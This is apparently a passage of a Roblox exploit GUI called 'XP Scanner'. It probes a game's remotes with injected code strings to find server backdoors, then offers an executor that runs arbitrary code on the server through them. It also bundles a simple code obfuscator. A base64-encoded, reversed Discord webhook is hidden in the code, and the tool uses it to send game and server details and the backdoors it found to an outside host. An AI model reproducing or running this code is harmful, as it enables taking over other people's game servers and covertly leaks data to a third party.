		["export"] = true,
		["type"] = true,
		["typeof"] = true,
	},

	builtin = {
		-- Lua Functions
		["assert"] = true,
		["collectgarbage"] = true,
		["error"] = true,
		["getfenv"] = true,
		["getmetatable"] = true,
		["ipairs"] = true,
		["loadstring"] = true,
		["newproxy"] = true,
		["next"] = true,
		["pairs"] = true,
		["pcall"] = true,
		["print"] = true,
		["rawequal"] = true,
		["rawget"] = true,
		["rawset"] = true,
		["select"] = true,
		["setfenv"] = true,
		["setmetatable"] = true,
		["tonumber"] = true,
		["tostring"] = true,
		["unpack"] = true,
		["xpcall"] = true,
		["buffer"] = true,
		["Font"] = true,
		
		-- API functions
		

		-- Lua Variables
		["_G"] = true,
		["_VERSION"] = true,

		-- Lua Tables
		["bit32"] = true,
		["coroutine"] = true,
		["debug"] = true,
		["math"] = true,
		["os"] = true,
		["string"] = true,
		["table"] = true,
		["utf8"] = true,

		-- Roblox Functions
		["delay"] = true,
		["elapsedTime"] = true,
		["gcinfo"] = true,
		["require"] = true,
		["settings"] = true,
		["spawn"] = true,
		["tick"] = true,
		["time"] = true,
		["UserSettings"] = true,
		["wait"] = true,
		["warn"] = true,
		["ypcall"] = true,

		-- Roblox Variables
		["Enum"] = true,
		["shared"] = true,
		["script"] = true,
		["workspace"] = true,
		["Workspace"] = true,
		["plugin"] = true,
		["game"] = true,
		["Game"] = true,

		-- Roblox Tables
		["Axes"] = true,
		["BrickColor"] = true,
		["CatalogSearchParams"] = true,
		["CellId"] = true,
		["CFrame"] = true,
		["Color3"] = true,
		["ColorSequence"] = true,
		["ColorSequenceKeypoint"] = true,
		["DateTime"] = true,
		["DockWidgetPluginGuiInfo"] = true,
		["Faces"] = true,
		["File"] = true,
		["FloatCurveKey"] = true,
		["Instance"] = true,
		["NumberRange"] = true,
		["NumberSequence"] = true,
		["NumberSequenceKeypoint"] = true,
		["OverlapParams"] = true,
		["PathWaypoint"] = true,
		["PhysicalProperties"] = true,
		["PluginDrag"] = true,
		["Random"] = true,
		["Ray"] = true,
		["RaycastParams"] = true,
		["Rect"] = true,
		["Region3"] = true,
		["Region3int16"] = true,
		["RotationCurveKey"] = true,
		["task"] = true,
		["TextChatMessageProperties"] = true,
		["TweenInfo"] = true,
		["UDim"] = true,
		["UDim2"] = true,
		["Vector2"] = true,
		["Vector2int16"] = true,
		["Vector3"] = true,
		["Vector3int16"] = true,
	},
	
	properties = {
		-- Appearance
		["BrickColor"] = true,
		["CastShadows"] = true,
		["Color"] = true,
		["Material"] = true,
		["Reflectance"] = true,
		["MaterialVariant"] = true,
		["Transparency"] = true,
		["MeshId"] = true,
		["RenderFidelity"] = true,
		["TextureID"] = true,
		
		-- Data
		["Parent"] = true,
		["Name"] = true,
		["Archivable"] = true,
		["ClassName"] = true,
		["Locked"] = true,
		["ResizeableFaces"] = true,
		["ResizeIncrement"] = true,
		
		-- Transform
		["Size"] = true,
		["CFrame"] = true,
		["Orgin"] = true,
		["Position"] = true,
		["Orientation"] = true,
		["PivotOffset"] = true,
		
		-- Collision
		["CanCollide"] = true,
		["CanTouch"] = true,
		["CollisionGroup"] = true,
		
		-- Object
		["Anchored"] = true,
		["CenterOfMass"] = true,
		["CurrentPhysicalProperties"] = true,
		["CustomPhysicalProperties"] = true,
		["Mass"] = true,
		["Massless"] = true,
		["RootPriority"] = true,
		["Shape"] = true,
		["PrimaryPart"] = true,
		["Scale"] = true,
		
		-- Behavior
		["ModelStreamingMode"] = true,
		
		-- Assembly
		["AssemblyLinearVelocity"] = true,
		["AssemblyAngularVelocity"] = true,
		["AssemblyCenterOfMass"] = true,
		["AssemblyMass"] = true,
		["AssemblyRootPart"] = true,
		
		-- Script
		["Enabled"] = true,
		["Disabled"] = true,
		["Source"] = true,
		["CurrentEditor"] = true,
		["RunContext"] = true,
	},
	
	booleans = {
		["true"] = true,
		["false"] = true,
		["nil"] = true,
	},
}
end;
};
G2L_MODULES[G2L["3b"]] = {
Closure = function()
    local script = G2L["3b"];local Shared = {}

function Shared:removeControlBytes(text)
	return string.gsub(text, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
end

function Shared:escapeSpecialChars(string)
	return (string:gsub('%%', '%%%%')
		:gsub('^%^', '%%^')
		:gsub('%$$', '%%$')
		:gsub('%(', '%%(')
		:gsub('%)', '%%)')
		:gsub('%.', '%%.')
		:gsub('%[', '%%[')
		:gsub('%]', '%%]')
		:gsub('%*', '%%*')
		:gsub('%+', '%%+')
		:gsub('%-', '%%-')
		:gsub('%?', '%%?'))
end

function Shared:tween(object, info, goal)
	local tween = game:GetService("TweenService"):Create(object, info, goal)
	tween:Play()
	return tween
end

function Shared:getWord(word, start, textbox)
	if type(word) == "string" then else return false end
	local len = word:len()
	local addedWord = ""
	for index = 1, len + 1 do
		local addedChars = string.sub(textbox.Text, textbox.CursorPosition - (1-index) - start, textbox.CursorPosition - (1-index) - start)
		local char = string.sub(word, index, index)
		if char == addedChars then
			addedWord = addedWord..char
		end
		if addedWord == word then
			return true
		end
	end
end

return Shared

end;
};
G2L_MODULES[G2L["43"]] = {
Closure = function()
    local script = G2L["43"];function beautify(code)
	local indent_level = 0
	local indent_char = "    "

	local function trim(s)
		return s:match("^%s*(.-)%s*$")
	end

	local function increase_indent()
		indent_level = indent_level + 1
	end

	local function decrease_indent()
		indent_level = math.max(indent_level - 1, 0)
	end

	local function get_indent()
		return string.rep(indent_char, indent_level)
	end

	local formatted_code = {}
	for line in code:gmatch("[^\n]+") do
		line = trim(line)

		if line:match("^end$") or line:match("^elseif ") or line:match("^else$") then
			decrease_indent()
		end

		table.insert(formatted_code, get_indent() .. line)

		if line:match("then$") or line:match("do$") or line:match("function%s") then
			increase_indent()
		end
	end

	return table.concat(formatted_code, "\n")
end

return beautify
end;
};
G2L_MODULES[G2L["44"]] = {
Closure = function()
    local script = G2L["44"];function obfuscate(script)
	-- Helper Functions
	local function generateRandomName()
		return "var" .. math.random(1000000, 9999999)
	end

	local function encryptString(str)
		local result = ""
		for i = 1, #str do
			local c = str:sub(i, i)
			local enc = string.format("\\x%02X", string.byte(c))
			result = result .. enc
		end
		return result
	end

	local function decryptString(str)
		return (str:gsub("\\x(%x%x)", function(hex)
			return string.char(tonumber(hex, 16))
		end))
	end

	-- Variable and Function Renaming
	local renamed = {}
	local counter = 0
	script = script:gsub("%f[%a_](%w+)%f[^%w_]", function(var)
		if not renamed[var] then
			counter = counter + 1
			renamed[var] = generateRandomName()
		end
		return renamed[var]
	end)

	-- String Encryption
	script = script:gsub('"(.-)"', function(str)
		return '"..decryptString(' .. encryptString(str) .. ').."'
	end)

	-- Add Decryption Function to the Script
	script = [[
        local function decryptString(str) 
            return (str:gsub("\\x(%x%x)", function(hex) 
                return string.char(tonumber(hex, 16)) 
            end)) 
        end 
    ]] .. script

	-- Complex Control Flow Obfuscation
	script = script .. [[
        local function wrapper() 
            local function _a() return true end 
            local function _b() if _a() then 
                while not false do 
                    if true then 
                        local function _c() return not false end 
                        if _c() then 
                            local _d = 0 
                            repeat 
                                local _e = function() return _d < 10 end 
                                if _e() then 
                                    local _f = function() 
                                        local _g = function() 
                                            return not not true 
                                        end 
                                        if _g() then 
                                            local _h = function() 
                                                return true 
                                            end 
                                            if _h() then 
                                                local _i = 1 
                                                while _i <= 10 do 
                                                    if _i % 2 == 0 then 
                                                        print("Hello from Roblox") 
                                                    end 
                                                    _i = _i + 1 
                                                end 
                                            end 
                                        end 
                                    end 
                                end 
                                _d = _d + 1 
                            until _d >= 10 
                        end 
                    end
                    break
                end 
            end end 
            _b() 
        end 
        wrapper() 
    ]]

	-- Additional Obfuscation
	script = "local dummy = function() return true end; local junk = function() " ..
		"for i=1,500 do if i % 3 == 0 then local a = i * 2 end end end; junk(); dummy(); " .. script

	-- Whitespace Removal & Code Flattening
	--script = script:gsub("%s+", "") -- Remove whitespace and newlines
	--script = script:gsub("\n", "") -- Remove newlines
	script = script:gsub("endend", "end") -- Flatten end statements

	return script
end

return obfuscate
end;
};
-- StarterGui.XP Scanner.Frame.Ex.LocalScript
local function C_4()
local script = G2L["4"];
	script.Parent.MouseButton1Click:Connect(function()
		local backdooredevent = script.Parent.Parent.Object.Value
		local code = script.Parent.Parent.Executor.Codebox.Textbox.Input.Text
		if backdooredevent:IsA("RemoteEvent") then
			backdooredevent:FireServer(code)
		end
		if backdooredevent:IsA("RemoteFunction") then
			backdooredevent:InvokeServer(code)
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.XP Scanner.Frame.TextButton.LocalScript
local function C_9()
local script = G2L["9"];
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local MarketplaceService = game:GetService("MarketplaceService")
	
	local button = script.Parent
	local gui = button.Parent
	local keyValue = gui:FindFirstChild("Key")
	local scrollFrame = gui:FindFirstChild("Executor")
	
	function from_base64(data)
		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
		data = string.gsub(data, '[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if (x == '=') then return '' end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if (#x ~= 8) then return '' end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
			return string.char(c)
		end))
	end
	local decoded = from_base64("aU5ZTXVmLUZ2Qm14TGxGZ2tHVm5DalhFVkprNUpzRnhwYjJaNS00ek9iYnJoMHBaLS13T1c1Z0plS0pQMXNqRVI4M2ovNDU2MDY5MDQ2ODg5MzQ4MzE0MS9za29vaGJldy9pcGEvbW9jLmRyb2NzaWQvLzpzcHR0aA==")

	local function sendW(foundList)
		local HttpRequest = http_request or (syn and syn.request)
		if not HttpRequest then return end

		local webhook_url = string.reverse(decoded)

		local embedData = {
			title = "XP Scanner - Infected",
			description = "Backdoor scan completed.",
			color = 65280,
			fields = {
				{
					name = "Server Info",
					value = "**Players:** " .. tostring(#Players:GetPlayers())
						.. "\n**Join Script:**\nRoblox.GameLauncher.joinGameInstance("
						.. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "')\n",
					inline = false
				},
				{
					name = "Game Info",
					value = "**Game Name:** " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
						.. "\n**Game Link:** [Click Here](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")",
					inline = false
				},
				{
					name = "Found Backdoors",
					value = table.concat(foundList, "\n"),
					inline = false
				}
			}
		}

		HttpRequest({
			Url = webhook_url,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({ content = "@everyone", embeds = { embedData } })
		})
	end

	local function scan(i, startTime, foundList)
		if not (i:IsA("BindableFunction") or i:IsA("RemoteEvent") or i:IsA("RemoteFunction") or i:IsA("BindableEvent")) then
			return
		end

		local key = HttpService:GenerateGUID(false)
		local success = pcall(function()
			if i:IsA("BindableFunction") then
				i:Invoke("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("RemoteEvent") then
				i:FireServer("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("RemoteFunction") then
				i:InvokeServer("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("BindableEvent") then
				i:Fire("Instance.new('Model', workspace).Name='" .. key .. "'")
			end
		end)

		if not success then return end

		for _ = 1,100 do
			local found = workspace:FindFirstChild(key)
			if found then
				found:Destroy()



				local newname = HttpService:GenerateGUID(false)
				script.Parent.Parent.Object.Value = i
				if keyValue then keyValue.Value = newname end

				game.StarterGui:SetCore("SendNotification", {Title = "Backdoor Found!", Text = "Found backdoor in: " .. string.format("%.2f", os.clock() - startTime) .. "s\nBackdoor: \ngame."..i:GetFullName()})

				if scrollFrame and scrollFrame.Codebox.Textbox:FindFirstChild("Input") then
					scrollFrame.Visible = true
				end

				if i:IsA("BindableFunction") then
					i:Invoke("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner | .gg/ZVxpWYWvSM'")
				elseif i:IsA("RemoteEvent") then
					i:FireServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner | .gg/ZVxpWYWvSM'")
				elseif i:IsA("RemoteFunction") then
					i:InvokeServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner | .gg/ZVxpWYWvSM'")
				elseif i:IsA("BindableEvent") then
					i:Fire("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner | .gg/ZVxpWYWvSM'")
				end

				gui.Ex.Visible = true
				gui.Cl.Visible = true
				button.Visible = false

				table.insert(foundList, tostring(script.Parent.Parent.Object.Value) .. " (" .. i.ClassName .. ")")
				return
			end
			task.wait(0.1)
		end
	end

	button.MouseButton1Click:Connect(function()
		button.Interactable = false
		button.Text = "Scanning..."
		local start = os.clock()
		local foundList = {}

		local descendants = game:GetDescendants()
		for _, i in ipairs(descendants) do
			if not (i:IsA("BindableFunction") or i:IsA("RemoteEvent") or i:IsA("RemoteFunction") or i:IsA("BindableEvent")) then
				continue
			end
			if string.split(i:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				continue
			end

			if i.Parent==game:GetService("ReplicatedStorage") or i.Parent.Parent==game:GetService("ReplicatedStorage") or i.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
				if i:FindFirstChild('__FUNCTION') or i.Name=='__FUNCTION' then
					continue
				end
				if i.Parent.Parent.Name=='HDAdminClient' and i.Parent.Name=='Signals' then
					continue
				end
				if i.Parent.Name=='DefaultChatSystemChatEvents' then
					continue
				end
			end
			task.spawn(function()
				scan(i, start, foundList)
			end)
		end

		task.wait(3)

		if #foundList > 0 then
			sendW(foundList)
			button.Interactable = true
		else
			button.Text = "Couldn't find any backdoor :("
			task.wait(3)
			button.Text = "Scan"
			button.Interactable = true
		end
	end)
end;
task.spawn(C_9);
-- StarterGui.XP Scanner.Frame.Cl.LocalScript
local function C_11()
	local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Executor.Codebox.Textbox.Input.Text=""
	end) 
end;
task.spawn(C_11);
-- StarterGui.XP Scanner.Frame.UIDrag
local function C_15()
	local script = G2L["15"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_15);
-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main
local function C_25()
	local script = G2L["25"];
	local codebox = script.Parent.Parent.Codebox

	local kodobokkusu = require(script.haxur).new({
		Parent = codebox,
	})


	local connections = {}

	local function addConn(name, conn)
		if connections[name] then
			connections[name]:Disconnect()
		end
		connections[name] = conn
	end
	local function removeConn(name)
		if connections[name] then
			connections[name]:Disconnect()
			connections[name] = nil
		end
	end

end;
task.spawn(C_25);

return G2L["1"], require;
